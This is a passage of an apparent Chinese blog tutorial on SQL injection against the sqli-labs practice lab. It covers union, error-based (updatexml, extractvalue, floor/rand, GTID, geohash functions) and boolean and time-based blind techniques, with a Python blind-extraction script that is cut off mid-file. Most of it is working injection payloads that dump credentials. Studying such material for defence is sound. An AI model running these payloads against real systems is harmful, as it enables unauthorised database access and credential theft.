table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># 